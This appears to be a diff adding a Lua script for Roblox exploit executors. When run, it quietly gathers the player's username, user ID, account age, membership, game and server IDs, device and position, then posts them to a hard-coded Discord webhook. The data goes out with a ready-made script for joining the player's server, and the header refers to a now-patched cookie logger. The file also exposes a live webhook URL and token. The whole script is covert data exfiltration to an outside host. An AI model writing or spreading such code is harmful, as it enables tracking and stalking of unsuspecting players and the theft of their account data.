@@ -1,0 +1,72 @@
+getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1214531415568293959/PfBG06D8Z4U8PDPuDvWWwHAhcNfokKt3Z-DL025IZrrCcIzSPlyHbmejD9H_JSLgtpyz"
+getgenv().ExecLogSecret = true
+getgenv().idsss = "fdd3bbdc9554f43c65140baa02e1baf562b006"
+
+local ui = gethui()
+local folderName = "screen"
+local folder = Instance.new("Folder")
+folder.Name = folderName
+folder.Parent = ui
+
+local player = game:GetService("Players").LocalPlayer
+local players = game:GetService("Players")
+local userid = player.UserId
+local gameid = game.PlaceId
+local jobid = tostring(game.JobId)
+local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+local deviceType = game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
+local snipePlay = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
+local completeTime = os.date("%Y-%m-%d %H:%M:%S")
+local workspace = game:GetService("Workspace")
+local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
+local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
+local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
+local playerCount = #players:GetPlayers()
+local maxPlayers = players.MaxPlayers
+local health = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
+local maxHealth = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or "N/A"
+local position = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart.Position or "N/A"
+local gameVersion = game.PlaceVersion
+local pingValue = tonumber(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():match("(%d+)")) or "N/A"
+
+local function checkPremium()
+    local success, response = pcall(function() return player.MembershipType end)
+    return success and (response == Enum.MembershipType.None and "false" or "true") or "Failed to retrieve Membership:"
+end
+
+local url = getgenv().webhookexecUrl
+local webhookids = getgenv().idsss
+local data = {
+    ["content"] = "@everyone",
+    ['webhookid'] = webhookids, --ask playvora_1 to generate it
+    ["embeds"] = {{
+        ["title"] = "MADE BY Xennn EDITED BY XenonHUB | 🚀 **Script Execution Detected | Exec Log**",
+        ["description"] = "*✅ One of the Script's has been Executed.(🍪COOKIE LOGGER IS PATCHED FOR NOW!):*",
+        ["type"] = "rich",
+        ["color"] = tonumber(0xe67e22),
+        ["fields"] = {
+            {["name"] = "🔍 **Script Info**", ["value"] = "```💻 Script Name: " .. (getgenv().whscript or "N/A") .. "\n⏰ Executed At: " .. completeTime .. "```", ["inline"] = false},
+            {["name"] = "👤 **Player Details**", ["value"] = "```🧸 Username: " .. player.Name .. "\n📝 Display Name: " .. player.DisplayName .. "\n🆔 UserID: " .. userid .. "\n❤️ Health: " .. health .. " / " .. maxHealth .. "\n🔗 Profile: View Profile (https://www.roblox.com/users/" .. userid .. "/profile)```", ["inline"] = false},
+            {["name"] = "📅 **Account Information**", ["value"] = "```🗓️ Account Age: " .. player.AccountAge .. " days\n💎 Premium Status: " .. checkPremium() .. "\n📅 Account Created: " .. os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```", ["inline"] = false},
+            {["name"] = "🎮 **Game Details**", ["value"] = "```🏷️ Game Name: " .. gameName .. "\n🆔 Game ID: " .. gameid .. "\n🔗 Game Link (https://www.roblox.com/games/" .. gameid .. ")\n🔢 Game Version: " .. gameVersion .. "```", ["inline"] = false},
+            {["name"] = "🕹️ **Server Info**", ["value"] = "```👥 Players in Server: " .. playerCount .. " / " .. maxPlayers .. "\n🕒 Server Time: " .. os.date("%H:%M:%S") .. "```", ["inline"] = true},
+            {["name"] = "📡 **Network Info**", ["value"] = "```📶 Ping: " .. pingValue .. " ms```", ["inline"] = true},
+            {["name"] = "🖥️ **System Info**", ["value"] = "```📺 Resolution: " .. screenWidth .. "x" .. screenHeight .. "\n🔍 Memory Usage: " .. memoryUsage .. " MB\n⚙️ Executor: " .. (identifyexecutor and identifyexecutor() or "Unknown") .. "```", ["inline"] = true},
+            {["name"] = "📍 **Character Position Script**", ["value"] = "```game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(" .. tostring(position) .. "))```\n", ["inline"] = true},
+            {["name"] = "🪧 **Join Script**", ["value"] = "```lua\n" .. snipePlay .. "```", ["inline"] = false}
+        },
+        ["thumbnail"] = {["url"] = "https://media.discordapp.net/attachments/1086950661016535172/1287118927142453330/xenon.jpg?ex=66f06269&is=66ef10e9&hm=a5c19f820d20d7c5adcf2516cc2cd192abc460adebdda5f237deeed2696c02b3&=&format=webp&width=1165&height=655"},
+        ["footer"] = {["text"] = "Made by Xenon with ❤️ | " .. os.date("%Y-%m-%d %H:%M:%S"), ["icon_url"] = "https://media.discordapp.net/attachments/1086950661016535172/1287118927142453330/xenon.jpg?ex=66f06269&is=66ef10e9&hm=a5c19f820d20d7c5adcf2516cc2cd192abc460adebdda5f237deeed2696c02b3&=&format=webp&width=1165&height=655"}
+    }}
+}
+
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+local headers = {["content-type"] = "application/json"}
+local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
+local success, response = pcall(function()
+    return request({Url = url, Body = newdata, Method = "POST", Headers = headers})
+end)
+
+if not success then
+    warn("HTTP request failed: " .. tostring(response))
+end
